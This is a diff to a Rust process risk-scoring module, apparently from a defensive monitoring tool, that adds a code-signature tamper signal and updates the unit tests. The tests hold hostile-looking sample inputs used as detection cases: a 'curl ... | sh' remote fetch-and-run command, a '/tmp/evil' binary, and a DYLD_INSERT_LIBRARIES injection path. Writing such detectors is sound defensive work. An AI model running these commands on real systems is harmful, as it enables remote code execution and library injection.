@@ -4,6 +4,7 @@
 
 use serde::Serialize;
 
+use crate::binary_id::BinaryIdentity;
 use crate::model::{Process, Socket};
 
 pub const MAX_SCORE: u8 = 10;
@@ -16,7 +17,12 @@ pub struct Risk {
     pub signals: Vec<String>,
 }
 
-pub fn assess(p: &Process, sockets: &[Socket], fd_usage: Option<(u64, u64)>) -> Risk {
+pub fn assess(
+    p: &Process,
+    sockets: &[Socket],
+    fd_usage: Option<(u64, u64)>,
+    binary: Option<&BinaryIdentity>,
+) -> Risk {
     let mut score: u32 = 0;
     let mut signals: Vec<String> = Vec::new();
     let add = |weight: u32, msg: String, score: &mut u32, signals: &mut Vec<String>| {
@@ -167,6 +173,13 @@ pub fn assess(p: &Process, sockets: &[Socket], fd_usage: Option<(u64, u64)>) -> 
             );
         }
     }
+    // Code-signature verdict (only computed on deep paths — export / TUI
+    // detail): an invalid signature is a strong tamper indicator.
+    if let Some(id) = binary {
+        if let Some(flag) = id.suspicious() {
+            add(3, flag, &mut score, &mut signals);
+        }
+    }
 
     Risk {
         score: score.min(MAX_SCORE as u32) as u8,
@@ -267,7 +280,7 @@ mod tests {
 
     #[test]
     fn temp_and_deleted_score() {
-        let r = assess(&proc_with(Some("/tmp/evil", ), "/tmp/evil", true), &[], None);
+        let r = assess(&proc_with(Some("/tmp/evil", ), "/tmp/evil", true), &[], None, None);
         assert_eq!(r.score, 6);
         assert_eq!(r.signals.len(), 2);
         assert!(r.signals.iter().any(|s| s.contains("temp")));
@@ -275,27 +288,27 @@ mod tests {
 
     #[test]
     fn curl_pipe_shell_detected() {
-        let r = assess(&proc_with(None, "curl http://x.sh | sh", false), &[], None);
+        let r = assess(&proc_with(None, "curl http://x.sh | sh", false), &[], None, None);
         assert!(r.signals.iter().any(|s| s.contains("pipes")));
         assert_eq!(r.score, 4);
         // ordinary pipelines don't trigger
-        let ok = assess(&proc_with(None, "cat a | grep b", false), &[], None);
+        let ok = assess(&proc_with(None, "cat a | grep b", false), &[], None, None);
         assert_eq!(ok.score, 0);
     }
 
     #[test]
     fn fd_usage_thresholds() {
         // >=80%: strong signal (weight 2)
-        let hot = assess(&proc_with(None, "x", false), &[], Some((90, 100)));
+        let hot = assess(&proc_with(None, "x", false), &[], Some((90, 100)), None);
         assert_eq!(hot.score, 2);
         assert!(hot.signals.iter().any(|s| s.contains("nearly exhausted")));
         // 50-79%: context signal (weight 1)
-        let warm = assess(&proc_with(None, "x", false), &[], Some((55, 100)));
+        let warm = assess(&proc_with(None, "x", false), &[], Some((55, 100)), None);
         assert_eq!(warm.score, 1);
         // <50% or unreadable limit: silent
-        let cool = assess(&proc_with(None, "x", false), &[], Some((10, 100)));
+        let cool = assess(&proc_with(None, "x", false), &[], Some((10, 100)), None);
         assert_eq!(cool.score, 0);
-        let none = assess(&proc_with(None, "x", false), &[], Some((90, 0)));
+        let none = assess(&proc_with(None, "x", false), &[], Some((90, 0)), None);
         assert_eq!(none.score, 0);
     }
 
@@ -318,13 +331,13 @@ mod tests {
     fn health_state_signals() {
         let mut zombie = proc_with(None, "x", false);
         zombie.state = Some("Z".into());
-        let r = assess(&zombie, &[], None);
+        let r = assess(&zombie, &[], None, None);
         assert!(r.signals.iter().any(|s| s.contains("zombie")));
         assert_eq!(r.score, 2);
 
         let mut stopped = proc_with(None, "x", false);
         stopped.state = Some("T".into());
-        let r = assess(&stopped, &[], None);
+        let r = assess(&stopped, &[], None, None);
         assert!(r.signals.iter().any(|s| s.contains("stopped")));
         assert_eq!(r.score, 1);
     }
@@ -335,14 +348,14 @@ mod tests {
         hot.cpu_time_ms = Some(3 * 3600 * 1000); // 3h cpu
         hot.mem_kb = Some(2 * 1024 * 1024); // 2 GiB
         hot.started = Some(crate::util::now_unix() - 100 * 24 * 3600); // 100 days
-        let r = assess(&hot, &[], None);
+        let r = assess(&hot, &[], None, None);
         assert!(r.signals.iter().any(|s| s.contains("2h of CPU")));
         assert!(r.signals.iter().any(|s| s.contains("1 GB of memory")));
         assert!(r.signals.iter().any(|s| s.contains("90 days")));
         assert_eq!(r.score, 3);
 
         // Missing fields stay silent.
-        let clean = assess(&proc_with(None, "x", false), &[], None);
+        let clean = assess(&proc_with(None, "x", false), &[], None, None);
         assert_eq!(clean.score, 0);
     }
 
@@ -350,20 +363,20 @@ mod tests {
     fn suspicious_cwd_and_caps() {
         let mut sussy = proc_with(None, "x", false);
         sussy.cwd = Some("/tmp".into());
-        let r = assess(&sussy, &[], None);
+        let r = assess(&sussy, &[], None, None);
         assert!(r.signals.iter().any(|s| s.contains("suspicious working directory")));
 
         // Container cwds are inside the container's own fs — skip.
         let mut boxed = proc_with(None, "x", false);
         boxed.cwd = Some("/".into());
         boxed.container = Some("docker: web (id ab)".into());
-        let r = assess(&boxed, &[], None);
+        let r = assess(&boxed, &[], None, None);
         assert!(r.signals.is_empty());
 
         let mut capped = proc_with(None, "x", false);
         capped.user = Some("alice".into());
         capped.capabilities = vec!["CAP_CHOWN".into(), "CAP_SYS_ADMIN".into()];
-        let r = assess(&capped, &[], None);
+        let r = assess(&capped, &[], None, None);
         assert!(r
             .signals
             .iter()
@@ -372,7 +385,7 @@ mod tests {
         let mut root = proc_with(None, "x", false);
         root.user = Some("root".into());
         root.capabilities = vec!["CAP_SYS_ADMIN".into()];
-        let r = assess(&root, &[], None);
+        let r = assess(&root, &[], None, None);
         assert!(r.signals.is_empty());
     }
 
@@ -384,7 +397,7 @@ mod tests {
             ("DYLD_LIBRARY_PATH".into(), "/tmp".into()),
             ("DYLD_INSERT_LIBRARIES".into(), "/tmp/evil.dylib".into()),
         ]);
-        let r = assess(&p, &[], None);
+        let r = assess(&p, &[], None, None);
         assert!(r
             .signals
             .iter()
